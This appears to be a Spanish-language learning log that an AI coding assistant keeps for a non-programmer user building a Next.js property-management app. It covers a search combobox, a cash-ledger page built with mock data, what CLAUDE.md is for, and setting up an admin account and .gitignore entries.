- **Constantes de color como única fuente de verdad**: Si el color `C_INGRESO = "#6ee7a0"` está en un solo lugar y se usa en 5 sitios distintos, cambiar el verde requiere cambiar una sola línea. Si el hex estuviera repetido en cada uso, habría que buscarlo y cambiarlo en los 5 lugares sin perder ninguno. Esto es el principio DRY (Don't Repeat Yourself).

---

### Preguntas para reflexionar

1. El buscador filtra en el cliente (en el navegador, sobre los datos ya cargados). Si un día hay 500 contratos, ¿seguiría siendo suficiente este enfoque o habría que buscar en el servidor mientras el usuario escribe? ¿Cuál sería la diferencia para el usuario?
2. Ahora los contratos muestran dirección + propietario + inquilinos. ¿De dónde viene esa información? Repasá el archivo `route.ts` de contratos para ver cómo el servidor la construye antes de devolverla.

---

### Qué debería anotar en Obsidian

- [ ] **Concepto**: Orden de eventos del navegador (mousedown → blur → mouseup → click) — por qué importa al construir componentes interactivos
- [ ] **Patrón**: Combobox / buscador con dropdown propio — la receta completa con `onMouseDown` para prevenir blur
- [ ] **Concepto**: DRY (Don't Repeat Yourself) — constantes de color como ejemplo concreto
- [ ] **Concepto**: `searchText` vs `label` — separar lo que se muestra de lo que se busca

---

## Sesión 2026-04-13 — Módulo Caja General (wireframe → producción)

### Qué hice

1. **Creé `/src/app/caja/page.tsx`** — el punto de entrada de la ruta `/caja`. Es un Server Component que monta el layout y delega la UI al componente cliente.

2. **Creé `/src/app/caja/caja-general-client.tsx`** — la página completa de Caja General reproducida desde el wireframe, con:
   - 4 KPIs (Total cobrado, Pendiente, Liquidado, En mora)
   - 3 tarjetas de acciones pendientes con scroll a sección y apertura de modales
   - Tabla de movimientos con filtros funcionales (Todos / Contratos / Manuales / A validar / Vencidos)
   - Barra de totales al pie de la tabla
   - Sección de índices pendientes con urgencia visual (error / mostaza)
   - Modal "Nuevo movimiento" con toggle ingreso/egreso, chips de categoría y campos opcionales
   - Modal "Liquidación al propietario" con breakdown de conceptos y ajuste manual
   - Selector de período funcional (mes/año navegable con flechas)

3. **Actualicé `menu-config.ts`** — agregué "Caja General" con ícono `Landmark` en el menú de staff y admin, antes de Propietarios.

4. **Actualicé `dashboard-layout.tsx`** — agregué `caja: "Caja General"` al mapa de labels de breadcrumb.

---

### Por qué lo hice así y no de otra forma

- **Client Component separado del Server Component**: La página tiene mucho estado interactivo (filtros, modales, selector de período). En Next.js App Router, los Server Components no pueden tener estado. La solución es `page.tsx` (server, puede exportar `metadata` y es fácil agregar fetching de datos después) + `caja-general-client.tsx` (client, maneja todo el estado).

- **Tokens CSS `var(--color-arce-*)` en lugar de clases Tailwind puras**: Los tokens de Arce están definidos en `globals.css` con `@theme`. Tailwind genera las clases automáticamente (`bg-arce-primary`, etc.), pero para valores complejos como `rgba(255,180,162,0.12)` que no tienen una clase exacta, usé `style={{ ... }}` con las variables CSS directamente. Es más fiel al diseño system que inventar clases arbitrarias.

- **Datos mock hardcodeados**: La tabla de movimientos usa datos estáticos por ahora. La alternativa era conectar a la API real, pero eso requiere primero crear el esquema de base de datos para `caja`. Para el MVP, primero se valida la UI, después se conecta el backend.

- **Sub-componentes en el mismo archivo**: `PendienteCard`, `IndiceCard`, `FormGroup`, `ModalBackdrop`, `Tag` son componentes pequeños que solo existen para esta vista. Ponerlos en archivos separados hubiera sido sobre-ingeniería — tres usos como máximo cada uno. Un archivo de 400 líneas bien organizado es más manejable que 8 archivos de 50.

- **`<style>` inline para `.form-input-arce`**: El input necesita estilos de focus (`:focus`) que Tailwind no puede manejar con solo `className`. En lugar de crear un archivo CSS separado para un selector, preferí el scoped `<style>` dentro del componente. No es ideal pero es práctico para el MVP.

---

### Conceptos que aparecieron

- **Server Component vs Client Component**: En Next.js App Router, todo es Server Component por defecto (se renderiza en el servidor, no hay estado, no hay eventos del navegador). Para agregar interactividad (`useState`, `onClick`, etc.) necesitás marcar el componente con `"use client"` al principio del archivo. Los Server Components pueden importar Client Components, pero no al revés.

- **Prerenderizado estático (`○`)**: El build mostró `/caja` como `○ (Static)`. Eso significa que Next.js detectó que la página no tiene fetching de datos dinámicos y la prerenderizó como HTML en tiempo de build. Cuando alguien entre, recibirá el HTML listo sin esperar al servidor. Cuando conectemos el backend, pasará a `ƒ (Dynamic)`.

- **Tokens CSS vs clases Tailwind**: Los tokens (`--color-arce-primary`) son variables CSS estándar que cualquier estilo puede consumir. Las clases Tailwind (`bg-arce-primary`) son utilidades generadas por Tailwind que internamente asignan `background-color: var(--color-arce-primary)`. El resultado visual es el mismo, pero las clases son más cortas. Para valores que Tailwind no puede expresar (rgba con opacidad flotante), los tokens directos son la única opción.

- **`hasRouteAccess` — seguridad por defecto seguro**: La función devuelve `true` para cualquier ruta no listada explícitamente. `/caja` no estaba en la lista de rutas restringidas, así que accede cualquier usuario autenticado. Esto es intencional para el MVP — cuando tengamos roles de staff vs admin, se puede agregar la restricción.

---

### Preguntas para reflexionar

1. La tabla de movimientos hoy mezcla contratos y movimientos manuales en un array estático. Cuando conectemos el backend, ¿cómo harías para que vengan de dos endpoints distintos y se muestren en la misma tabla ordenados por fecha?
2. El modal "Ejecutar transferencia" tiene un botón que en producción debería hacer una transferencia real de dinero. ¿Qué precauciones habría que tomar para que esa acción no se ejecute por accidente (doble click, refresco de página, etc.)?

---

### Qué debería anotar en Obsidian

- [ ] **Concepto**: Server Component vs Client Component — cuándo usar cada uno y por qué no podés mezclarlos en cualquier dirección  
- [ ] **Patrón**: `page.tsx` (server) + `*-client.tsx` (client) — el patrón estándar para páginas con estado en Next.js App Router  
- [ ] **Concepto**: Tokens CSS (`--var`) vs clases Tailwind — la diferencia, cuándo usar cada uno  
- [ ] **Decisión técnica**: Por qué los sub-componentes de una sola vista van en el mismo archivo en lugar de archivos separados (criterio: menos de 3 usos = mismo archivo)

---

## Concepto — CLAUDE.md
> Plantilla: Concepto PR · `tag: concepto/pr`
> Listo para pegar en Obsidian

**¿Qué es?**
`CLAUDE.md` es un archivo de texto que se coloca en la raíz del proyecto. Claude Code lo lee automáticamente al inicio de cada sesión. Contiene instrucciones, contexto del proyecto y convenciones que de otra forma habría que explicar de nuevo cada vez.

**¿Para qué sirve?**
Para que Claude arranque cada conversación ya sabiendo cómo está armado el proyecto: qué comandos usar, cómo está organizado el código, qué patrones seguir. Sin él, cada sesión empieza desde cero.

**Analogía**
Es el manual de incorporación que le dejás a un empleado nuevo antes de su primer día. No lo reemplaza a él, pero evita que tenga que preguntar todo desde el principio.

**Ejemplo concreto**
En este proyecto, `CLAUDE.md` le dice a Claude que el API usa ElysiaJS (no Next.js estándar), que la autenticación pasa por `src/proxy.ts` (no el `middleware.ts` habitual), y que los comandos se corren con `bun` (no `npm`). Son detalles que no son obvios mirando el código por primera vez.

**Cómo se crea**
1. Crear un archivo llamado `CLAUDE.md` en la raíz del proyecto (donde está el `package.json`)
2. Escribirlo en Markdown — Claude lo lee como texto plano
3. Incluir: comandos comunes, arquitectura general, decisiones no obvias
4. No incluir: cosas que ya están en el código o que son genéricas de cualquier proyecto
5. Se puede usar el comando `/init` dentro de Claude Code para que lo genere automáticamente analizando el proyecto

**Cómo se relaciona con**
- `claude.local.md` — mismo concepto pero personal y privado (no se sube a GitHub). Contiene preferencias tuyas, tu perfil de aprendizaje, instrucciones de cómo explicarte las cosas.
- `.gitignore` — `CLAUDE.md` sí va al repositorio (lo comparte todo el equipo). `claude.local.md` va al `.gitignore` porque es solo tuyo.

**Preguntas que me hice**
- ¿Claude realmente lo lee o es solo una convención? → Lo lee automáticamente, es una función nativa de Claude Code.
- ¿Qué pasa si hay cosas contradictorias entre `CLAUDE.md` y `claude.local.md`? → `claude.local.md` tiene prioridad porque se carga después y es más específico.

**Fuente**
Sesión de trabajo 2026-04-11 — creación del CLAUDE.md con el comando `/init`

---

## Sesión 2026-04-11 — Primer ingreso a la app

### Qué hice

1. **Creé el archivo `CLAUDE.md`** — un mapa del proyecto para que yo (Claude) entienda la estructura cada vez que empezamos una sesión nueva.

2. **Creé tu usuario admin** en la base de datos con email y contraseña propios, con rol `account_admin` (acceso total). Lo hice via un script temporal que después borré para no dejar tu contraseña expuesta en el código.

3. **Redirigí la página de inicio (`/`)** al tablero (`/tablero`). Antes mostraba la pantalla genérica de Next.js.

4. **Agregué `LOG.md` y `claude.local.md` al `.gitignore`** para que no se suban a GitHub.

---

### Por qué lo hice así y no de otra forma

- **CLAUDE.md**: Sin este archivo, cada sesión nueva empiezo desde cero sin saber nada del proyecto. Es como dejarle un manual al turno siguiente.

- **Script temporal para el usuario**: La alternativa era modificar el seed (el script de datos de prueba), pero ese archivo sí se sube a GitHub y no es buena idea poner tus credenciales reales ahí. Creé un script separado, lo corrí, y lo borré.

- **Redirect en `/`**: La página que veías es la que viene por defecto cuando creás un proyecto con Next.js. No tiene ninguna lógica nuestra — es solo un placeholder. El redirect es la forma estándar de decirle "cuando alguien entra acá, mandalo al tablero".

- **`.gitignore`**: El `.env` ya estaba ignorado. `LOG.md` y `claude.local.md` son archivos personales tuyos que no tienen sentido en el repositorio compartido con el programador.

---

### Conceptos que aparecieron

- **`.env`**: Archivo donde se guardan "secretos" de la app (contraseñas de base de datos, claves de API). Git lo ignora automáticamente para que no se suban a internet. Analogía: es como la caja fuerte del local, no la vidriera.

- **`.gitignore`**: Lista de archivos que Git ignora al momento de guardar cambios. Lo que está ahí nunca llega al repositorio compartido.

- **Seed**: Script que crea datos de prueba en la base de datos. Es idempotente, es decir, podés correrlo mil veces y no rompe nada — si el dato ya existe, lo saltea.

- **Rol `account_admin`**: El sistema tiene tres niveles de acceso: `visitor` (solo mira), `agent` (puede crear cosas), `account_admin` (acceso completo). Tu usuario tiene el máximo.

- **Redirect**: Instrucción que le dice al navegador "no te quedes acá, andá a esta otra página". Es instantáneo, el usuario ni lo nota.

- **Placeholder**: Página o componente vacío que viene "de fábrica" y hay que reemplazar. En este caso, la pantalla de Next.js con "To get started, edit page.tsx".

---

### Preguntas para reflexionar

1. Si el `.env` nunca se sube a GitHub, ¿cómo hace el programador para configurar la app en su computadora? ¿Cómo se comparte ese archivo de forma segura?
2. ¿Qué pasaría si alguien con rol `visitor` intentara entrar a una ruta de creación de clientes? ¿Quién lo bloquea?

---

### Qué debería anotar en Obsidian

- [ ] **Concepto**: `.env` y `.gitignore` — para qué sirven y cómo se relacionan
- [ ] **Concepto**: Roles de usuario (`visitor`, `agent`, `account_admin`) — qué puede hacer cada uno
- [ ] **Decisión técnica**: Por qué se crea un script temporal para datos sensibles en lugar de modificar el seed
- [ ] **Bug resuelto**: Página de inicio mostraba placeholder de Next.js en vez del tablero — causa: `page.tsx` nunca fue reemplazado, fix: redirect a `/tablero`